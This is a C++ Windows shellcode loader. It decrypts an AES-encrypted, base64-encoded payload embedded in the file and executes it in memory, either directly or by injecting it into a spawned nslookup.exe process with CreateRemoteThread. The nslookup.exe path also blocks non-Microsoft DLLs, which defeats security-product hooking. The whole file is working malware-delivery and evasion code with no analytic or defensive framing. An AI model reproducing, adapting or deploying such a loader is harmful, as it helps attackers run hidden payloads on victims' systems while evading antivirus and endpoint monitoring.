#include <iostream>
#include <Windows.h>
#include <vector>
#include "aes.hpp"
#include "base64.h"

VOID startup(std::vector<byte> payload)
{
    // additional information
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPVOID mem;
    HANDLE hProcess, hThread;
    DWORD pid;
    DWORD bytesWritten;

    // set the size of the structures
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    SIZE_T size = 0;

    // Lets protect this process by disallowing non-microsoft DLL hooking:
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(),
        0,
        size
    );
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
    
    // start the program up
    LPCWSTR cmd = TEXT("C:\\Windows\\SysWOW64\\nslookup.exe");
    if (!CreateProcess(
        cmd,				// Executable
        NULL,				// Command line
        NULL,				// Process handle not inheritable
        NULL,				// Thread handle not inheritable
        FALSE,				// Set handle inheritance to FALSE
        CREATE_NO_WINDOW,	// Do Not Open a Window
        NULL,				// Use parent's environment block
        NULL,				// Use parent's starting directory 
        (LPSTARTUPINFOW)&si,// Pointer to STARTUPINFO structure
        &pi					// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    )) {
        DWORD errval = GetLastError();
        std::cout << "FAILED" << errval << std::endl;
    }

    WaitForSingleObject(pi.hProcess, 4000);
    hProcess = pi.hProcess;

    mem = VirtualAllocEx(hProcess, 0, payload.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, mem, payload.data(), payload.size(), 0);
    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, 0);

}

VOID direct(std::vector<byte> payload)
{
    DWORD procID;
    LPVOID temptation = VirtualAlloc(0, payload.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(temptation, payload.data(), payload.size());
    VirtualProtect(temptation, payload.size(), PAGE_EXECUTE, &procID);
    int(*f)() = (int(*)()) temptation;
    f();
}

int main()
{

    std::vector<uint8_t> ciphertext, recovered;
    std::string shellcode, decoded;
    base64 b64 = base64();

    // Decode shellcode and load into uint8_t vector for decryption
    shellcode = "NzpDicgvxYSFLFj4TXyTpetjtnlqaD3eGgdKKu4ZsaLetSTM0+LyTtb/Lrltd4/j4+43uQY76OL2Kcjhji19edDzibkIKxvJL55F9638Uui49k/dBPVcT4UUsb572GjyUqddR0ffMxv0ncne3nLR5mspXTYeutTz6wMISeHlXDkeJXSlwp3uggYNAVQ0VpIQSZwlaEAurIxsQyeXTZw3RFDZEownz/0h0+TvBwC+lvLQfhdwBjR/GfaSh4DsLlUUyDSGmAoCP7fGj9b2B9E5nA==";
    decoded = b64.base64_decode(shellcode);
    ciphertext.clear();
    std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));
    
    // AES Decryption Objection
    struct AES_ctx e_ctx;
    uint8_t iv[] = { 0x89,0x54,0x7f,0x64,0xc0,0xce,0x3a,0x44,0xf0,0xee,0xaf,0x1,0xa8,0xdc,0x6b,0x65 };
    uint8_t key[] = { 0x70,0x76,0x20,0xf2,0x3f,0x4c,0x4c,0x10,0x45,0xfb,0x50,0x93,0xd8,0xd1,0xc9,0xfb,0x6c,0x30,0x45,0x88,0xdd,0xb2,0xf4,0xaf,0x9c,0x1c,0x22,0x13,0x26,0x67,0x24,0xbd };
    AES_init_ctx_iv(&e_ctx, key, iv);

    // DECRYPT
    struct AES_ctx d_ctx;
    AES_init_ctx_iv(&d_ctx, key, iv);
    AES_CBC_decrypt_buffer(&d_ctx, ciphertext.data(), ciphertext.size());
    recovered.clear();
    //std::copy(ciphertext.begin(), ciphertext.end(), std::back_inserter(recovered));

    // Remove the padding from the decypted plaintext
    for (int i = 0; i < ciphertext.size(); i++)
    {
        if (ciphertext[i] == 0x90 && ciphertext[i + 1] == 0x90)
        {
            break;
        }
        else
        {
            recovered.push_back(ciphertext[i]);
        }
    }

    for (int i = 0; i < recovered.size(); i++) 
    {
        printf("%x", recovered[i]);
    }

    direct(recovered);
    //startup(recovered);

    return 0;
}

